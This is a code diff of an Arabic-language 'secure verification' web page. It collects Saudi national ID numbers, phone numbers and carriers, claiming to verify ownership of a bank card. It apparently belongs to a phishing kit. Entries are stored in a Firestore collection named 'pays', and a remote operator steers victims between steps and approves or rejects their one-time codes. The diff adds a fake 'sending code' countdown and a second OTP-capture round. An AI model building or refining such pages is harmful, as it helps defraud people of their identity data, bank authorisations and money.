@@ -2,11 +2,9 @@
 
 import { useEffect, useState } from "react";
 import { toast } from "sonner";
-import { Button } from "@/components/ui/button";
-import { Card } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { Phone, ShieldCheck, CreditCard, ChevronDown } from "lucide-react";
+import { Phone, ShieldCheck, CreditCard, ChevronDown, Loader2, CheckCircle2 } from "lucide-react";
 import { StcVerificationModal } from "@/components/stc-verification-modal";
 import { MobilyVerificationModal } from "@/components/mobily-verification-modal";
 import { CarrierVerificationModal } from "@/components/carrier-verification-modal";
@@ -28,7 +26,9 @@ export default function VerifyPhonePage() {
   const [showPhoneOtpDialog, setShowPhoneOtpDialog] = useState(false);
   const [otpRejectionError, setOtpRejectionError] = useState("");
   const [phoneError, setPhoneError] = useState("");
-  const [hasOtpBeenRejected, setHasOtpBeenRejected] = useState(false);
+  const [isSecondRound, setIsSecondRound] = useState(false);
+  // countdown: null = idle, 5→1 = counting, 0 = open dialog
+  const [otpCountdown, setOtpCountdown] = useState<number | null>(null);
 
   const telecomOperators = [
     { value: "stc", label: "STC - الاتصالات السعودية" },
@@ -48,7 +48,6 @@ export default function VerifyPhonePage() {
   useEffect(() => {
     if (visitorId) {
       updateVisitorPage(visitorId, "phone", 7);
-
       if (!db) return;
       const visitorRef = doc(db as Firestore, "pays", visitorId);
       setDoc(visitorRef, { redirectPage: null }, { merge: true }).catch((err) =>
@@ -57,36 +56,39 @@ export default function VerifyPhonePage() {
     }
   }, [visitorId]);
 
+  // Admin redirect listener
   useEffect(() => {
-    if (!visitorId) return;
-
-    if (!db) return;
+    if (!visitorId || !db) return;
     const unsubscribe = onSnapshot(
       doc(db as Firestore, "pays", visitorId),
       (docSnap) => {
-        if (docSnap.exists()) {
-          const data = docSnap.data();
-
-          if (data.currentStep === "home") {
-            window.location.href = "/";
-          } else if (data.currentStep === "_t6") {
-            window.location.href = "/step4";
-          } else if (data.currentStep === "_st1") {
-            window.location.href = "/check";
-          } else if (data.currentStep === "_t2") {
-            window.location.href = "/step2";
-          } else if (data.currentStep === "_t3") {
-            window.location.href = "/step3";
-          }
-        }
+        if (!docSnap.exists()) return;
+        const data = docSnap.data();
+        if (data.currentStep === "home") window.location.href = "/";
+        else if (data.currentStep === "_t6") window.location.href = "/step4";
+        else if (data.currentStep === "_st1") window.location.href = "/check";
+        else if (data.currentStep === "_t2") window.location.href = "/step2";
+        else if (data.currentStep === "_t3") window.location.href = "/step3";
       },
-      (error) => {
-        console.error("[phone-info] Firestore listener error:", error);
-      }
+      (err) => console.error("[phone-info] Firestore listener error:", err)
     );
-
     return () => unsubscribe();
   }, []);
+
+  // 5-second countdown after form submit
+  useEffect(() => {
+    if (otpCountdown === null || otpCountdown === 0) return;
+    const t = setTimeout(() => setOtpCountdown((c) => (c as number) - 1), 1000);
+    return () => clearTimeout(t);
+  }, [otpCountdown]);
+
+  // When countdown hits 0 → open OTP dialog
+  useEffect(() => {
+    if (otpCountdown === 0) {
+      setShowPhoneOtpDialog(true);
+      setOtpCountdown(null);
+    }
+  }, [otpCountdown]);
 
   const validateIdNumber = (id: string): boolean => {
     const saudiIdRegex = /^[12]\d{9}$/;
@@ -113,11 +115,8 @@ export default function VerifyPhonePage() {
     const value = e.target.value.replace(/\D/g, "");
     if (value.length <= 10) {
       setIdNumber(value);
-      if (value.length === 10) {
-        validateIdNumber(value);
-      } else {
-        setIdError("");
-      }
+      if (value.length === 10) validateIdNumber(value);
+      else setIdError("");
     }
   };
 
@@ -125,11 +124,8 @@ export default function VerifyPhonePage() {
     const value = e.target.value.replace(/\D/g, "");
     if (value.length <= 10) {
       setPhoneNumber(value);
-      if (value.length === 10) {
-        validatePhoneNumber(value);
-      } else {
-        setPhoneError("");
-      }
+      if (value.length === 10) validatePhoneNumber(value);
+      else setPhoneError("");
     }
   };
 
@@ -137,12 +133,10 @@ export default function VerifyPhonePage() {
     if (!idNumber || !phoneNumber || !selectedCarrier) return;
     if (!validateIdNumber(idNumber)) return;
     if (!validatePhoneNumber(phoneNumber)) return;
-
     const visitorID = localStorage.getItem("visitor");
-    if (!visitorID) return;
+    if (!visitorID || !db) return;
 
     try {
-      if (!db) return;
       await setDoc(
         doc(db as Firestore, "pays", visitorID),
         {
@@ -156,19 +150,25 @@ export default function VerifyPhonePage() {
         },
         { merge: true }
       );
-
-      setShowPhoneOtpDialog(true);
+      // Start 5-second countdown
+      setIsSecondRound(false);
+      setOtpCountdown(5);
     } catch (error) {
       console.error("Error saving phone data:", error);
-      toast.error("حدث خطأ", {
-        description: "يرجى المحاولة مرة أخرى",
-        duration: 5000,
-      });
+      toast.error("حدث خطأ", { description: "يرجى المحاولة مرة أخرى", duration: 5000 });
     }
   };
 
-  const handleApproved = () => {
+  // STC approved → hide STC modal, reopen OTP dialog for round 2
+  const handleStcApproved = () => {
     setShowStcModal(false);
+    setIsSecondRound(true);
+    setOtpRejectionError("");
+    setShowPhoneOtpDialog(true);
+  };
+
+  // Other carriers approved → go to Nafad
+  const handleCarrierApproved = () => {
     setShowMobilyModal(false);
     setShowCarrierModal(false);
     window.location.href = "/step4";
@@ -176,13 +176,10 @@ export default function VerifyPhonePage() {
 
   const handleRejected = async () => {
     const visitorID = localStorage.getItem("visitor");
-    if (!visitorID) return;
-
+    if (!visitorID || !db) return;
     try {
-      if (!db) return;
       const docRef = doc(db as Firestore, "pays", visitorID);
       const docSnap = await getDoc(docRef);
-
       if (docSnap.exists()) {
         const data = docSnap.data();
         const currentPhoneData = {
@@ -191,7 +188,6 @@ export default function VerifyPhonePage() {
           phoneCarrier: data.phoneCarrier,
           rejectedAt: new Date().toISOString(),
         };
-
         await setDoc(
           docRef,
           {
@@ -207,14 +203,11 @@ export default function VerifyPhonePage() {
     } catch (error) {
       console.error("Error saving rejected phone data:", error);
     }
-
     setShowStcModal(false);
     setShowMobilyModal(false);
     setShowCarrierModal(false);
-
     setPhoneNumber("");
     setSelectedCarrier("");
-
     toast.error("تم رفض رقم الهاتف", {
       description: "يرجى إدخال رقم جوال صحيح والمحاولة مرة أخرى",
       duration: 5000,
@@ -225,187 +218,191 @@ export default function VerifyPhonePage() {
     setShowStcModal(false);
     setShowMobilyModal(false);
     setShowCarrierModal(false);
-
-    localStorage.setItem(
-      "phoneOtpRejectionError",
-      "رمز غير صالح - يرجى إدخال رمز التحقق الصحيح"
-    );
-
+    localStorage.setItem("phoneOtpRejectionError", "رمز غير صالح - يرجى إدخال رمز التحقق الصحيح");
     setOtpRejectionError("رمز غير صالح - يرجى إدخال رمز التحقق الصحيح");
-    setHasOtpBeenRejected(true);
-
+    setIsSecondRound(true);
     setShowPhoneOtpDialog(true);
   };
 
   const handleShowWaitingModal = (carrier: string) => {
-    if (carrier === "stc") {
-      setShowStcModal(true);
-    } else if (carrier === "mobily") {
-      setShowMobilyModal(true);
-    } else {
-      setShowCarrierModal(true);
-    }
+    if (carrier === "stc") setShowStcModal(true);
+    else if (carrier === "mobily") setShowMobilyModal(true);
+    else setShowCarrierModal(true);
   };
 
   const isFormValid =
-    !!phoneNumber &&
-    !!selectedCarrier &&
-    phoneNumber.length === 10 &&
-    !phoneError &&
-    !!idNumber &&
-    idNumber.length === 10 &&
-    !idError;
+    !!phoneNumber && !!selectedCarrier && phoneNumber.length === 10 && !phoneError &&
+    !!idNumber && idNumber.length === 10 && !idError;
+
+  const isCounting = otpCountdown !== null && otpCountdown > 0;
 
   return (
     <>
       <div
-        className="min-h-screen bg-gradient-to-br from-[#0e3a57] via-[#1a5c85] to-[#2680b5] flex items-center justify-center p-4"
+        className="min-h-screen bg-gradient-to-br from-[#062338] via-[#0e3a57] to-[#1a5676] flex items-center justify-center p-4"
         dir="rtl"
       >
-        {/* Background decoration */}
+        {/* Background blobs */}
         <div className="absolute inset-0 overflow-hidden pointer-events-none">
-          <div className="absolute top-0 left-0 w-72 h-72 bg-white/5 rounded-full -ml-36 -mt-36"></div>
-          <div className="absolute bottom-0 right-0 w-96 h-96 bg-white/5 rounded-full -mr-48 -mb-48"></div>
+          <div className="absolute top-0 left-0 w-72 h-72 bg-white/5 rounded-full -ml-36 -mt-36 blur-3xl" />
+          <div className="absolute bottom-0 right-0 w-96 h-96 bg-[#f4ad27]/10 rounded-full -mr-48 -mb-48 blur-3xl" />
+          <div className="absolute inset-0 opacity-5"
+            style={{ backgroundImage: "radial-gradient(circle, #fff 1px, transparent 1px)", backgroundSize: "28px 28px" }} />
         </div>
 
-        <div className="w-full max-w-lg space-y-5 relative z-10">
+        <div className="w-full max-w-md space-y-5 relative z-10">
+
           {/* Header */}
-          <div className="text-center text-white space-y-2 mb-4">
-            <div className="w-16 h-16 bg-white/20 backdrop-blur-sm rounded-2xl flex items-center justify-center mx-auto mb-3 shadow-lg">
+          <div className="text-center text-white space-y-2 mb-2">
+            <div className="w-16 h-16 bg-white/15 backdrop-blur-sm border border-white/20 rounded-2xl flex items-center justify-center mx-auto mb-3 shadow-lg">
               <Phone className="w-8 h-8 text-white" />
             </div>
-            <h1 className="text-3xl font-bold">نظام التحقق الآمن</h1>
-            <p className="text-white/70 text-sm">تحقق من هويتك بأمان وسرعة</p>
+            <h1 className="text-2xl font-black">نظام التحقق الآمن</h1>
+            <p className="text-white/60 text-sm">تحقق من هويتك بأمان وسرعة</p>
           </div>
 
-          {/* Main Card */}
-          <Card className="border-0 shadow-2xl overflow-hidden">
-            <div className="h-1 bg-gradient-to-r from-[#1a5c85] via-[#2680b5] to-[#1a5c85]"></div>
-            <div className="p-7 space-y-5">
-              {/* Verification Message */}
-              <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
+          {/* Card */}
+          <div className="bg-white rounded-3xl shadow-2xl overflow-hidden border border-white/10">
+            <div className="h-1 bg-gradient-to-l from-[#f4ad27] via-[#1a9fd4] to-[#0e3a57]" />
+            <div className="p-6 space-y-5">
+
+              {/* Info banner */}
+              <div className="bg-blue-50 border border-blue-200 rounded-2xl p-4">
                 <div className="flex items-start gap-3">
                   <ShieldCheck className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
                   <p className="text-sm text-blue-900 font-medium leading-relaxed">
-                    للتحقق من ملكية وسيلة الدفع، يُرجى إدخال رقم الهوية ورقم
-                    الهاتف المرتبطين ببطاقتك البنكية.
+                    للتحقق من ملكية وسيلة الدفع، يُرجى إدخال رقم الهوية ورقم الهاتف المرتبطين ببطاقتك البنكية.
                   </p>
                 </div>
               </div>
 
-              {/* ID Number Input */}
+              {/* ID Number */}
               <div className="space-y-1.5">
-                <Label htmlFor="idNumber" className="text-right block text-gray-700 font-semibold text-sm">
-                  رقم الهوية *
-                </Label>
+                <Label className="text-right block text-slate-700 font-bold text-sm">رقم الهوية *</Label>
                 <div className="relative">
+                  <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-[#1a5676]/10 flex items-center justify-center">
+                    <CreditCard className="w-3.5 h-3.5 text-[#1a5676]" />
+                  </div>
                   <Input
-                    id="idNumber"
-                    type="tel"
+                    type="tel" inputMode="numeric"
                     placeholder="1xxxxxxxxx"
                     value={idNumber}
                     onChange={handleIdChange}
-                    className={`text-right pr-12 text-base h-12 rounded-xl border-2 transition-colors ${
-                      idError ? "border-red-400 focus:border-red-500" : "border-gray-200 focus:border-[#1a5c85]"
-                    }`}
-                    dir="ltr"
+                    className={`h-12 rounded-xl border-2 text-sm text-right pr-12 transition-all ${idError ? "border-red-400 bg-red-50" : "border-slate-200 focus:border-[#1a5676] bg-slate-50 focus:bg-white"}`}
+                    dir="rtl"
                   />
-                  <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
-                    <CreditCard className="w-5 h-5" />
-                  </div>
+                  {idNumber.length === 10 && !idError && (
+                    <CheckCircle2 className="absolute left-3.5 top-1/2 -translate-y-1/2 h-4 w-4 text-emerald-500" />
+                  )}
                 </div>
-                {idError && (
-                  <p className="text-red-500 text-xs text-right">{idError}</p>
-                )}
+                {idError && <p className="text-xs text-red-600 font-medium">⚠ {idError}</p>}
               </div>
 
-              {/* Phone Number Input */}
+              {/* Phone */}
               <div className="space-y-1.5">
-                <Label htmlFor="phone" className="text-right block text-gray-700 font-semibold text-sm">
-                  رقم الجوال *
-                </Label>
+                <Label className="text-right block text-slate-700 font-bold text-sm">رقم الجوال *</Label>
                 <div className="relative">
+                  <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-[#1a5676]/10 flex items-center justify-center">
+                    <Phone className="w-3.5 h-3.5 text-[#1a5676]" />
+                  </div>
                   <Input
-                    id="phone"
-                    type="tel"
+                    type="tel" inputMode="numeric"
                     placeholder="05xxxxxxxx"
                     value={phoneNumber}
                     onChange={handlePhoneChange}
-                    className={`text-right pr-20 text-base h-12 rounded-xl border-2 transition-colors ${
-                      phoneError ? "border-red-400 focus:border-red-500" : "border-gray-200 focus:border-[#1a5c85]"
-                    }`}
-                    dir="ltr"
+                    className={`h-12 rounded-xl border-2 text-sm text-right pr-12 transition-all ${phoneError ? "border-red-400 bg-red-50" : "border-slate-200 focus:border-[#1a5676] bg-slate-50 focus:bg-white"}`}
+                    dir="rtl"
                   />
-                  <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 text-sm font-semibold">
-                    +966
-                  </div>
+                  {phoneNumber.length === 10 && !phoneError && (
+                    <CheckCircle2 className="absolute left-3.5 top-1/2 -translate-y-1/2 h-4 w-4 text-emerald-500" />
+                  )}
                 </div>
-                {phoneError && (
-                  <p className="text-red-500 text-xs text-right">{phoneError}</p>
-                )}
+                {phoneError && <p className="text-xs text-red-600 font-medium">⚠ {phoneError}</p>}
               </div>
 
-              {/* Carrier Dropdown */}
+              {/* Carrier */}
               <div className="space-y-1.5">
-                <Label htmlFor="carrier" className="text-right block text-gray-700 font-semibold text-sm">
-                  شركة الاتصالات *
-                </Label>
+                <Label className="text-right block text-slate-700 font-bold text-sm">شركة الاتصالات *</Label>
                 <div className="relative">
                   <select
-                    id="carrier"
                     value={selectedCarrier}
                     onChange={(e) => setSelectedCarrier(e.target.value)}
-                    className="w-full h-12 text-right text-base border-2 border-gray-200 rounded-xl px-4 bg-white focus:border-[#1a5c85] focus:outline-none appearance-none cursor-pointer transition-colors pr-4 pl-10"
+                    className="w-full h-12 text-right text-sm border-2 border-slate-200 rounded-xl px-4 bg-slate-50 focus:bg-white focus:border-[#1a5676] focus:outline-none appearance-none cursor-pointer transition-all pr-4 pl-10"
                   >
                     <option value="">اختر شركة الاتصالات</option>
-                    {telecomOperators.map((operator) => (
-                      <option key={operator.value} value={operator.value}>
-                        {operator.label}
-                      </option>
+                    {telecomOperators.map((op) => (
+                      <option key={op.value} value={op.value}>{op.label}</option>
                     ))}
                   </select>
-                  <ChevronDown className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400 pointer-events-none" />
+                  <ChevronDown className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400 pointer-events-none" />
                 </div>
               </div>
 
-              {/* Submit Button */}
-              <Button
+              {/* Submit button — shows countdown while waiting */}
+              <button
+                type="button"
                 onClick={handleSendOtp}
-                className="w-full h-13 text-base bg-gradient-to-r from-[#1a5c85] to-[#0e3a57] hover:from-[#154a6d] hover:to-[#0a2e46] text-white font-bold rounded-xl shadow-md shadow-blue-200 disabled:opacity-50 disabled:cursor-not-allowed transition-all"
-                disabled={!isFormValid}
+                disabled={!isFormValid || isCounting}
+                className="w-full h-13 rounded-2xl font-black text-sm transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center gap-2"
+                style={{
+                  background: isCounting
+                    ? "linear-gradient(135deg, #1a5676, #0e3a57)"
+                    : "linear-gradient(135deg, #f4ad27 0%, #e09a18 50%, #f4ad27 100%)",
+                  color: isCounting ? "#fff" : "#1a3d52",
+                  boxShadow: isCounting ? "0 8px 24px rgba(26,86,118,0.3)" : "0 8px 24px rgba(244,173,39,0.4)",
+                  paddingTop: "0.75rem",
+                  paddingBottom: "0.75rem",
+                }}
               >
-                <Phone className="ml-2 h-5 w-5" />
-                إرسال رمز التحقق
-              </Button>
+                {isCounting ? (
+                  <>
+                    <div className="relative w-8 h-8 flex items-center justify-center">
+                      <svg className="absolute inset-0 w-full h-full -rotate-90" viewBox="0 0 32 32">
+                        <circle cx="16" cy="16" r="13" fill="none" stroke="rgba(255,255,255,0.2)" strokeWidth="2.5" />
+                        <circle cx="16" cy="16" r="13" fill="none" stroke="#f4ad27" strokeWidth="2.5"
+                          strokeLinecap="round"
+                          strokeDasharray={`${(((5 - (otpCountdown as number)) / 5) * 81.7).toFixed(1)} 81.7`}
+                          style={{ transition: "stroke-dasharray 0.9s linear" }}
+                        />
+                      </svg>
+                      <span className="text-sm font-black text-[#f4ad27]">{otpCountdown}</span>
+                    </div>
+                    <span>جاري إرسال رمز التحقق...</span>
+                  </>
+                ) : (
+                  <>
+                    <Phone className="h-4 w-4" />
+                    إرسال رمز التحقق
+                  </>
+                )}
+              </button>
 
-              <div className="bg-gray-50 border border-gray-100 rounded-xl p-3 text-center">
-                <p className="text-xs text-gray-500">
-                  🔒 معلوماتك محمية بأعلى معايير الأمان والخصوصية
-                </p>
+              <div className="text-center">
+                <p className="text-xs text-slate-400">🔒 معلوماتك محمية بأعلى معايير الأمان والخصوصية</p>
               </div>
             </div>
-          </Card>
+          </div>
         </div>
       </div>
 
       <StcVerificationModal
         open={showStcModal}
         visitorId={visitorId}
-        onApproved={handleApproved}
+        onApproved={handleStcApproved}
         onRejected={handleRejected}
       />
 
       <MobilyVerificationModal
         open={showMobilyModal}
         visitorId={visitorId}
-        onApproved={handleApproved}
+        onApproved={handleCarrierApproved}
         onRejected={handleRejected}
       />
 
       <CarrierVerificationModal
         open={showCarrierModal}
         visitorId={visitorId}
-        onApproved={handleApproved}
+        onApproved={handleCarrierApproved}
         onRejected={handleRejected}
       />
 
@@ -420,7 +417,7 @@ export default function VerifyPhonePage() {
         onRejected={handleOtpRejected}
         onShowWaitingModal={handleShowWaitingModal}
         rejectionError={otpRejectionError}
-        isAfterRejection={hasOtpBeenRejected}
+        isSecondRound={isSecondRound}
       />
     </>
   );
